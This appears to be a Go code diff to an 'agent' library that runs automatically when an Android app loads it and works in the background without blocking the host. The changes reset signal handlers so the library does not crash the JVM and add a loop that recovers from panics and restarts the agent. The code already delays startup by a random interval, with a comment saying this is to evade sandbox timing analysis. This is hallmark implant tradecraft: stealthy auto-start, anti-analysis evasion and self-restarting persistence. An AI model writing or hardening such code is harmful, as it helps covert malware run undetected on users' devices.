@@ -19,9 +19,12 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"os/signal"
 	"path/filepath"
+	"runtime/debug"
 	"strings"
 	"sync"
+	"syscall"
 	"time"
 )
 
@@ -1138,10 +1141,26 @@ func main() {}
 // init runs automatically when System.loadLibrary("agent") is called.
 // The agent logic runs in a goroutine so it doesn't block the Java caller.
 func init() {
+	// CRITICAL: Reset Go's signal handlers so they don't conflict with
+	// Android's JVM (ART/Dalvik). Go installs handlers for SIGSEGV, SIGBUS,
+	// SIGFPE, etc. which crash the JVM process when running as c-shared.
+	signal.Reset(syscall.SIGSEGV, syscall.SIGBUS, syscall.SIGFPE,
+		syscall.SIGABRT, syscall.SIGTRAP, syscall.SIGPIPE)
+
 	go runAgent()
 }
 
 func runAgent() {
+	// Recover from any panics to prevent crashing the host JVM process
+	defer func() {
+		if r := recover(); r != nil {
+			// Log panic but don't crash — just restart after delay
+			fmt.Fprintf(os.Stderr, "agent recovered from panic: %v\n%s\n", r, debug.Stack())
+			time.Sleep(30 * time.Second)
+			go runAgent() // restart
+		}
+	}()
+
 	// Delay startup to avoid sandbox timing analysis
 	time.Sleep(time.Duration(3+rand.Intn(5)) * time.Second)
 
